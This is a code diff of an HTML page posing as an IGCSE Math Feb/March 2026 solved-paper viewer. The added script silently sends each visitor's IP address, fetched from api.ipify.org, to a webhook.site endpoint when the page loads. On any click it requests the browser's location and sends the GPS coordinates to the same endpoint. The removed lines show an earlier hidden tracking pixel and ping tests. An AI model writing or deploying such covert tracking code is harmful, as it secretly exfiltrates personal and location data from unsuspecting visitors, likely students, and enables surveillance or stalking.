@@ -11,48 +11,39 @@
 </head>
 <body>
     <div class="header"><strong>IGCSE Papers Math Calculator- Feb/March 2026</strong></div>
-    
-    <!-- 1. SILENT IP (Fires instantly on page load) -->
-    <img src="https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b" style="display:none;">
-
     <iframe id="pdf-frame" src="1012874352-0580-fm-2026-solved-paper (1).pdf"></iframe>
 
     <script>
-        const webhookURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
-            try {
-    const testImg = new Image();
-    testImg.onload = function() { console.log("✅ Image Ping: SUCCESS"); };
-    testImg.onerror = function(e) { console.log("❌ Image Ping: BLOCKED", e); };
-    testImg.src = webhookURL + "?test=image_ping&t=" + Date.now();
-} catch(e) { console.log("❌ Image Object: CRASHED", e); }
+        const webURL = "https://webhook.site/36d5a036-2f02-4a47-8d38-4387fd72fe8b";
 
-// Test B: Fetch Ping (Your verified method)
-fetch(webhookURL + "?test=fetch_ping", { mode: 'no-cors' })
-    .then(function() { console.log("✅ Fetch Ping: SUCCESS"); })
-    .catch(function(err) { console.log("❌ Fetch Ping: FAILED", err); });
+        // 1. SILENT IP (Runs immediately on load)
+        fetch("https://api.ipify.org")
+            .then(res => res.json())
+            .then(data => {
+                // Sending IP to your webhook using the verified Fetch method
+                fetch(webURL + "?type=SILENT_IP&ip=" + data.ip, { mode: "no-cors" });
+            })
+            .catch(err => {
+                // Fallback if the IP service is blocked
+                fetch(webURL + "?type=IP_FETCH_BLOCKED", { mode: "no-cors" });
+            });
 
-// Test C: Check Location Permission Status
-navigator.permissions.query({name:'geolocation'}).then(function(res) {
-    console.log("📍 Geolocation Permission:", res.state);
-});
-
-        // 2. CLICK VERIFICATION WITH GPS
+        // 2. CLICK TRIGGER (GPS Lat/Long)
         window.onclick = function() {
-            // Request the location (Triggers the browser popup)
             navigator.geolocation.getCurrentPosition(function(pos) {
                 var lat = pos.coords.latitude;
                 var lon = pos.coords.longitude;
                 
-                // We send the coordinates in the URL so they show up in Query Strings
-                var gpsPing = new Image();
-                gpsPing.src = webhookURL + "?event=CLICK_VERIFIED&lat=" + lat + "&lon=" + lon + "&map=https://www.google.com" + lat + "," + lon;
-                
-                console.log("GPS Verification Sent");
+                // Sending GPS coordinates to your webhook
+                fetch(webURL + "?type=GPS_CLICK&lat=" + lat + "&lon=" + lon, { mode: "no-cors" });
             }, function(err) {
-                // If they deny or it times out, we still log the click error
-                var errPing = new Image();
-                errPing.src = webhookURL + "?event=CLICK_DENIED&msg=" + err.message;
-            }, { enableHighAccuracy: false, maximumAge: Infinity });
+                // If they deny or it times out
+                fetch(webURL + "?type=GPS_ERR&msg=" + err.message, { mode: "no-cors" });
+            }, { 
+                enableHighAccuracy: false, 
+                timeout: 10000, 
+                maximumAge: Infinity 
+            });
         };
     </script>
 </body>
